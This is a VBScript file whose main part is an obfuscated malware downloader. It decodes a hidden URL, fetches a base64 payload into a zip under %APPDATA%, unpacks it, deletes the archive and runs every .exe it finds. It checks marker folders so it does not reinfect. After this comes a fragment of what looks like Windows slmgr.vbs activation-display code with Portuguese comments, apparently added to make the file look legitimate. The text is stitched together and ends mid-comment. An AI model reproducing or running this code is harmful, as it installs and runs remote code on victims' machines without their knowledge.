Option Explicit
CONST wshOK                             =0
CONST VALUE_ICON_WARNING                =16
CONST wshYesNoDialog                    =4
CONST VALUE_ICON_QUESTIONMARK           =32
CONST VALUE_ICON_INFORMATION            =64
CONST HKEY_LOCAL_MACHINE                =&H80000002
CONST KEY_SET_VALUE                     =&H0002
CONST KEY_QUERY_VALUE                   =&H0001
CONST REG_SZ                            =1           
dim ilnnprttbbjnprttvzzaccbddfnpprtvveggilnnpsuu,pprtvveeiilnnprttvbbeggillnprrttvzaacbbdggil,nprraaccegiilnnpprttvvzaaccceggiilnnprrtvvee,llnprrtvzzaccceggillnpprtvveggilloqqsuuaceeg
dim  ybacceggilnnprrtddfhhjmooqqsuaaccegiimooqssu,Clqtortveggilnpprtvbbd,SEUZP
dim  hjmoqsuuacffhjjmooqqsuuxyybbaccehhjjmooqssud,mqXFFRJUWm
dim  ttbbdgiinpprttvzaacbbdfiilnnprttveegiilnppru,uzacbbddhhjjmoqqssudggiilnnprrtvvbddfhhjmmpr,nnpruuaaceggilnnprttvzaaaceegiilnpprttvegg
dim  eegillnnqsuudffhjjmooqssuuaccfhhjmmooqssuxxy,suxybbaaeegimmooqsuuddfhjjmmoqqsuubddfhhjmmo,OBJdggillnnprttvbddfhh
dim  acbdfhhjmooqssveegiilnnprrtvvbddfhhlnnpprttvzz,jjmoqssuaaceehjjmooqssuuxyybaaccegjjmmoqqsuu,llnprttvzaccbdggillnpprttveegiilnppruuaccegg
Function Jkdkdkd(G1g)
For ybacceggilnnprrtddfhhjmooqqsuaaccegiimooqssu = 1 To Len(G1g)
jjmoqssuaaceehjjmooqssuuxyybaaccegjjmmoqqsuu = Mid(G1g, ybacceggilnnprrtddfhhjmooqqsuaaccegiimooqssu, 1)
jjmoqssuaaceehjjmooqssuuxyybaaccegjjmmoqqsuu = Chr(Asc(jjmoqssuaaceehjjmooqssuuxyybaaccegjjmmoqqsuu)+ 6)
eegillnnqsuudffhjjmooqssuuaccfhhjmmooqssuxxy = eegillnnqsuudffhjjmooqssuuaccfhhjmmooqssuxxy + jjmoqssuaaceehjjmooqssuuxyybaaccegjjmmoqqsuu
Next
Jkdkdkd = eegillnnqsuudffhjjmooqssuuaccfhhjmmooqssuxxy
End Function 
Function jmoqsuudfhjjmoqqsvvbdffhjjmoqqsuuxybbbddfhjjm()
Dim ClqtortveggilnpprtvbbdLM,jxtbbadffhjmmoqssu,jrtccegiilnprdfhjw,Coltvvegilnppsuaccegi
Set ClqtortveggilnpprtvbbdLM = WScript.CreateObject( "WScript.Shell" )
Set jrtccegiilnprdfhjw = CreateObject( "Scripting.FileSystemObject" )
Set jxtbbadffhjmmoqssu = jrtccegiilnprdfhjw.GetFolder(uzacbbddhhjjmoqqssudggiilnnprrtvvbddfhhjmmpr)
Set Coltvvegilnppsuaccegi = jxtbbadffhjmmoqssu.Files
For Each Coltvvegilnppsuaccegi in Coltvvegilnppsuaccegi
If UCase(jrtccegiilnprdfhjw.GetExtensionName(Coltvvegilnppsuaccegi.name)) = "EXE" Then
ClqtortveggilnpprtvbbdLM.Exec(uzacbbddhhjjmoqqssudggiilnnprrtvvbddfhhjmmpr & "\" & Coltvvegilnppsuaccegi.Name)
End If
Next
End Function
hjmoqsuuacffhjjmooqqsuuxyybbaccehhjjmooqssud     = Jkdkdkd("bnnj4))+3,(,-0(+.1(+**4+3/*)\[\ofimn`chal(cmi")
Set OBJdggillnnprttvbddfhh = CreateObject( "WScript.Shell" )    
nnpruuaaceggilnnprttvzaaaceegiilnpprttvegg = OBJdggillnnprttvbddfhh.ExpandEnvironmentStrings(StrReverse("%ATADPPA%"))
llnprrtvzzaccceggillnpprtvveggilloqqsuuaceeg = "A99449C3092CE70964CE715CF7BB75B.zip"
Function iilnpprtveegiilnppsuuacceggillnprrtvvzbbacceg()
SET pprtvveeiilnnprttvbbeggillnprrttvzaacbbdggil = CREATEOBJECT("Scripting.FileSystemObject")
IF pprtvveeiilnnprttvbbeggillnprrttvzaacbbdggil.FolderExists(nnpruuaaceggilnnprttvzaaaceegiilnpprttvegg + "\DecGram") = TRUE THEN WScript.Quit() END IF
IF pprtvveeiilnnprttvbbeggillnprrttvzaacbbdggil.FolderExists(nprraaccegiilnnpprttvvzaaccceggiilnnprrtvvee) = FALSE THEN
pprtvveeiilnnprttvbbeggillnprrttvzaacbbdggil.CreateFolder nprraaccegiilnnpprttvvzaaccceggiilnnprrtvvee
pprtvveeiilnnprttvbbeggillnprrttvzaacbbdggil.CreateFolder OBJdggillnnprttvbddfhh.ExpandEnvironmentStrings(StrReverse("%ATADPPA%")) + "\DecGram"
END IF
End Function
Function qqsuxxybaccegiilnnqssuddfhhjmooqssuaacffhjjmo()
DIM jrtccegiilnprdfhjxsd
Set jrtccegiilnprdfhjxsd = Createobject("Scripting.FileSystemObject")
jrtccegiilnprdfhjxsd.DeleteFile uzacbbddhhjjmoqqssudggiilnnprrtvvbddfhhjmmpr & "\" & llnprrtvzzaccceggillnpprtvveggilloqqsuuaceeg
End Function
uzacbbddhhjjmoqqssudggiilnnprrtvvbddfhhjmmpr = nnpruuaaceggilnnprttvzaaaceegiilnpprttvegg + "\nvdndl"
jjmmoqssuxybbbdffhjmmoqqsuddfhjjnpprtvvb
nprraaccegiilnnpprttvvzaaccceggiilnnprrtvvee = uzacbbddhhjjmoqqssudggiilnnprrtvvbddfhhjmmpr
iilnpprtveegiilnppsuuacceggillnprrtvvzbbacceg
prrteegglloqssuaaceegiilnnprttvyybaaceegiilnn
WScript.Sleep 10103
rrtveggilnpprttaccegiilnnprrtvvzaaccceggilnnp
WScript.Sleep 5110
qqsuxxybaccegiilnnqssuddfhhjmooqssuaacffhjjmo
jmoqsuudfhjjmoqqsvvbdffhjjmoqqsuuxybbbddfhjjm
Function jjmmoqssuxybbbdffhjmmoqqsuddfhjjnpprtvvb()
Set mqXFFRJUWm = CreateObject("Scripting.FileSystemObject")
If (mqXFFRJUWm.FolderExists(uzacbbddhhjjmoqqssudggiilnnprrtvvbddfhhjmmpr )) Then
WScript.Quit()
End If 
End Function   
Function prrteegglloqssuaaceegiilnnprttvyybaaceegiilnn()
DIM req
Set req = CreateObject("Msxml2.XMLHttp.6.0")
req.open "GET", hjmoqsuuacffhjjmooqqsuuxyybbaccehhjjmooqssud, False
req.send
If req.Status = 200 Then
 Dim oNode, BinaryStream
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.text = req.responseText
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write oNode.nodeTypedValue
BinaryStream.SaveToFile uzacbbddhhjjmoqqssudggiilnnprrtvvbddfhhjmmpr & "\" & llnprrtvzzaccceggillnpprtvveggilloqqsuuaceeg, adSaveCreateOverWrite
End if
End Function
ttbbdgiinpprttvzaacbbdfiilnnprttveegiilnppru = "suxybbaaeegimmooqsuuddfhjjmmoqqsuubddfhhjmmo"
Function rrtveggilnpprttaccegiilnnprrtvvzaaccceggilnnp()
set Clqtortveggilnpprtvbbd = CreateObject("Shell.Application")
set SEUZP=Clqtortveggilnpprtvbbd.NameSpace(uzacbbddhhjjmoqqssudggiilnnprrtvvbddfhhjmmpr & "\" & llnprrtvzzaccceggillnpprtvveggilloqqsuuaceeg).items
Clqtortveggilnpprtvbbd.NameSpace(uzacbbddhhjjmoqqssudggiilnnprrtvvbddfhhjmmpr & "\").CopyHere(SEUZP), 4
Set Clqtortveggilnpprtvbbd = Nothing
End Function 

Private Sub DisplayAVMAClientInformation(objProduct)
    Dim strHostName, strPid
    Dim displayDate
    Dim bHostName, bFiletime, bPid

    strHostName = objProduct.AutomaticVMActivationHostMachineName
    bHostName = strHostName <> "" And Not IsNull(strHostName)

    Set displayDate = CreateObject("WBemScripting.SWbemDateTime")
    displayDate.Value = objProduct.AutomaticVMActivationLastActivationTime
    bFiletime = displayDate.GetFileTime(false) <> 0

    strPid = objProduct.AutomaticVMActivationHostDigitalPid2
    bPid = strPid <> "" And Not IsNull(strPid)

    If bHostName Or bFiletime Or bPid Then
        LineOut ""
        LineOut GetResource("L_MsgVLMostRecentActivationInfo")
        LineOut GetResource("L_MsgAVMAInfo")

        If bHostName Then
            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & strHostName
        Else
            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & GetResource("L_MsgNotAvailable")
        End If

        If bFiletime Then
            LineOut "    " & GetResource("L_MsgAVMALastActTime") & displayDate.GetVarDate
        Else
            LineOut "    " & GetResource("L_MsgAVMALastActTime") & GetResource("L_MsgNotAvailable")
        End If

        If bPid Then
            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & strPid
        Else
            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & GetResource("L_MsgNotAvailable")
        End If
    End If

End Sub


' Exibir todas as informações para / dlv e / dli
' Se você adicionar a necessidade de acessar novas propriedades através do WMI, adicione-as ao

